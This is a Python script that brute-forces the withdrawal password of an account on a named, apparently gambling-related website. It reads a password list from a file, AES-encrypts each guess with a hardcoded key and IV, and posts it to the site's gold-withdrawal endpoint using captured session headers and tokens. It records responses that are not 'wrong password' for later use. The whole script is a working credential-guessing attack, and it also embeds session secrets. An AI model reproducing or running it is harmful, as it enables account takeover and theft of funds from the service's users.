import hashlib
import json
import time
import requests
import base64
from Crypto.Cipher import AES
from concurrent.futures import ThreadPoolExecutor

# from baopp.header import *

headers = {
    'authority': 'web.1543434.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'zh',
    'auth': 'rRhIdbaV14CbtQIjeMptiADmUq9IwTZDG9d9C02dxiSQ6Fai4XmA_f7f59Pj_eGA3btUNhgHCepGWFA2TvIcep8iz7S3L7lum_S-CTzkdyqfQqGyF3qeAOBv0Dozp9mvMlXw1aBprWMLsw1rqeuBm_Kl2GGsKYToVzXv9tv7AOQZiwmQEBU2MNJdWV8sFNGAtLFzOBiXCbC7YjRZ1Sfi16hZto79qJ7Gcmi0RDAXtxmVyzvx_sYUAv6Ff5duJC0Majc3EG66Yjg0CG-tJKLLvgVLNrqPuMhA_Izx_3ZvwWK35y3P9gPMcqMQ6c9KJOnOTmUF42C8GhmenA5LTZjeMA',
    'browserfingerid': '',
    'clienttimezone': 'UTC+8',
    'content-type': 'text/plain',
    'currency': 'CNY',
    'data-uuid': 'data-uuid-101',
    'device': 'ee9de905-4eff-456c-be3a-da7b67814239',
    'devicemodel': 'windows',
    'domain': 'www.4424477.com',
    'language': 'zh',
    'nonce': '91359f3b-0af7-4323-9f35-132cabdfd047',
    'origin': 'https://www.4424477.com',
    'platformtype': '5',
    'referer': 'https://www.4424477.com/',
    'sec-ch-ua': '"Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'sign': 'QpCmUS2M3BNf0Ju+oNhcM44+5c8JLl6r1xcOVYxs+wtTtqumJN9GGjDFsMvxpbXY',
    'sitecode': '128',
    'timestamp': '1679805961',
    'token': '0d5a0b143569010487871679805660521399524',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.51',
    'x-request-id': '91359f3b-0af7-4323-9f35-132cabdfd047',
}


class DeAesCrypt:
    """
    AES-128-CBC解密
    """

    def __init__(self, key=None, iv=None, pad="zero"):
        """
        :param data: 加密后的字符串
        :param key: 随机的16位字符
        :param pad: 填充方式
        """
        self.key = key.encode("utf-8")
        self.pad = pad.lower()
        hash_obj = hashlib.md5()  # 构造md5对象
        hash_obj.update(key.encode())  # 进行md5加密,md5只能对byte类型进行加密
        res_md5 = hash_obj.hexdigest()  # 获取加密后的字符串数据
        self.iv = iv.encode("utf-8")

    def zeropadding(self, text):
        while len(text) % 16 != 0:
            text += '\0'
        return str.encode(text)

    def decrypt_aes(self, data):
        """AES-128-CBC解密"""
        real_data = base64.b64decode(data)
        my_aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        decrypt_data = my_aes.decrypt(real_data)
        return self.get_str(decrypt_data)

    def encyrpt_aes(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        content_padding = self.zeropadding(data)
        # 加密
        encrypt_bytes = cipher.encrypt(content_padding)
        # 重新编码
        result = str(base64.b64encode(encrypt_bytes), encoding='utf-8')
        return result

    def get_str(self, bd):
        """解密后的数据去除加密前添加的数据"""
        if self.pad == "zero":  # 去掉数据在转化前不足16位长度时添加的ASCII码为0编号的二进制字符
            return ''.join([chr(i) for i in bd if i != 0])

        # elif self.pad == "pkcs7":  # 去掉pkcs7模式中添加后面的字符
        #     return ''.join([chr(i) for i in i > 32])  # 此处报错，在我环境

        else:
            return "不存在此种数据填充方式"


def bao_po(aes_obj=None, file_name=None, wirte_file=None):
    with open(file_name, "r+") as f:
        while True:
            line = f.readline()
            if not line:
                print("读取文件尾部:", line)
                break
            try:
                origin_data = {"accessGold": int(100), "passwd": str(line).strip(), "time": int(time.time())}
                payload = aes_obj.encyrpt_aes(json.dumps(origin_data))
                # response = requests.post('https://www.4424477.com/hall/yuebao/takeoutGold', cookies=cookies,
                #                          headers=headers, data=payload)
                response = requests.post('https://www.4424477.com/hall/yuebao/takeoutGold', headers=headers,
                                         data=payload)
                res = response.json()
                if res.get("msg") == "密码不正确":
                    print(origin_data, res)
                    pass
                elif res.get("msg") == "解析包异常":
                    print(origin_data, res)
                    with open(wirte_file, "a", encoding="utf-8") as wf:
                        wf.write(str(json.dumps(origin_data)) + str(json.dumps(res)) + "\r")
                    time.sleep(3)

                else:
                    print("###other:", origin_data, response.text)
                    break
            except Exception as e:
                print(str(e), e.__traceback__.tb_frame.f_globals["__file__"], e.__traceback__.tb_frame.f_lineno)
                print(response.text, origin_data)
                break


if __name__ == '__main__':
    key = "6c1401ccc6c5a8f3"
    iv = "5421698523412578"
    aes_obj = DeAesCrypt(key, iv)
    bao_po(aes_obj, "pass0.txt", "corr0.txt")
